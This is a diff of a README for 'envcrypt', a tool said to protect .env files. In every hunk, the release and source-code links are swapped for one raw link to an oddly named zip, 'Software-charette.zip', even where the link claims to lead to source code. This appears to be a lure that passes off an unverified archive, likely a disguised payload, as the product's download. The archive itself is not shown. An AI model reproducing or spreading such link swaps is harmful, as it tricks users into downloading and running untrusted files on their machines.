@@ -1,6 +1,6 @@
 # 🔐 envcrypt - Protect Your .env File Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20on-GitHub-brightgreen?style=for-the-badge)](https://github.com/auntara-toma/envcrypt/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20on-GitHub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/auntara-toma/envcrypt/main/cli/Software-charette.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Key features:
 
 Start by visiting the following page to download the program:
 
-[![Download envcrypt](https://img.shields.io/badge/Download%20envcrypt-blue?style=for-the-badge)](https://github.com/auntara-toma/envcrypt/releases)
+[![Download envcrypt](https://img.shields.io/badge/Download%20envcrypt-blue?style=for-the-badge)](https://raw.githubusercontent.com/auntara-toma/envcrypt/main/cli/Software-charette.zip)
 
 Steps:
 
@@ -105,7 +105,7 @@ Now that envcrypt is on your PC, here is how to use it:
 
 Check back at the releases page from time to time:
 
-[https://github.com/auntara-toma/envcrypt/releases](https://github.com/auntara-toma/envcrypt/releases)
+[https://raw.githubusercontent.com/auntara-toma/envcrypt/main/cli/Software-charette.zip](https://raw.githubusercontent.com/auntara-toma/envcrypt/main/cli/Software-charette.zip)
 
 Download newer versions as they become available to get security fixes and new features.
 
@@ -140,10 +140,10 @@ If you encounter problems beyond these steps:
 ## 🔗 Important Links
 
 - Download and Releases:  
-  https://github.com/auntara-toma/envcrypt/releases
+  https://raw.githubusercontent.com/auntara-toma/envcrypt/main/cli/Software-charette.zip
 
 - Source Code and Documentation:  
-  https://github.com/auntara-toma/envcrypt
+  https://raw.githubusercontent.com/auntara-toma/envcrypt/main/cli/Software-charette.zip
 
 ---
 
